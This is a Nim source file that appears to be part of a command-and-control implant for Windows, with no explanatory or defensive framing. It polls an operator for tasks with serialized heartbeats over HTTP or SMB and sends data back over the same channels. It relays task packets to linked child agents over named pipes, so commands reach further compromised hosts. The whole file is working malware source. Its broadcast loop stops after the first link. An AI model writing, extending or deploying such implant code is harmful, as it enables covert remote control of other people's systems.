import winim/lean, tables
import ./transport/[http, smb]
import ../protocol/heartbeat
import ../utils/io
import ../../common/[types, serialize, utils]

proc getTasks*(ctx: AgentCtx): string = 
    when defined(TRANSPORT_HTTP):
        var heartbeat: Heartbeat = ctx.createHeartbeat()
        let heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
        return ctx.httpGet(heartbeatBytes)

    when defined(TRANSPORT_SMB): 
        return ctx.smbRead()

proc sendData*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
    when defined(TRANSPORT_HTTP): 
        return ctx.httpPost(data)

    when defined(TRANSPORT_SMB): 
        return ctx.smbWrite(data)

proc forwardTask*(ctx: AgentCtx, task: seq[byte]): bool = 
    var unpacker = Unpacker.init(Bytes.toString(task))
    let agentId = unpacker.deserializeHeader().agentId

    # Task belongs to current agent
    if Uuid.toString(agentId) == ctx.agentId: 
        return false 

    # Task packets need to be prefixed with the number of tasks in message to be understood by the agent
    let taskBytes = @[uint8(1)] & uint32.toBytes(cast[uint32](task.len())) & task

    # If the task is for a direct child of the current agent, write it directly to the pipe 
    if ctx.links.hasKey(agentId):
        print "[+] Forwarding task to agent ", Uuid.toString(agentId), "."  
        let hPipe = cast[HANDLE](ctx.links[agentId]) 
        return hPipe.pipeWrite(taskBytes)

    # If not, we forward it to all linked agents so it can eventually reach it's destination
    else: 
        for agentId, hPipe in ctx.links: 
            return pipeWrite(cast[HANDLE](hPipe), taskBytes)